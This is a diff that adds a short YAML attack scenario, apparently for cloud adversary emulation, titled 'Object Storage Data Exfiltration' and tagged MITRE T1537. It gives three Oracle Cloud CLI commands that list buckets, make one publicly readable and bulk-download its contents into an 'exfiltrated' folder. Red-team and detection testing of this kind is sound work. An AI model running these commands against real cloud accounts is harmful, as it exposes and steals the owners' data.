@@ -1,0 +1,11 @@
+description: Make a bucket public and download sensitive contents.
+mitre_technique: T1537
+name: Object Storage Data Exfiltration
+stage: Collection
+steps:
+- action: oci os bucket list --compartment-id <compartment-id>
+  description: List all object storage buckets
+- action: oci os bucket update --name <bucket-name> --public-access-type ObjectRead
+  description: Make the bucket publicly readable
+- action: oci os object bulk-download --bucket-name <bucket-name> --download-dir ./exfiltrated
+  description: Download all objects
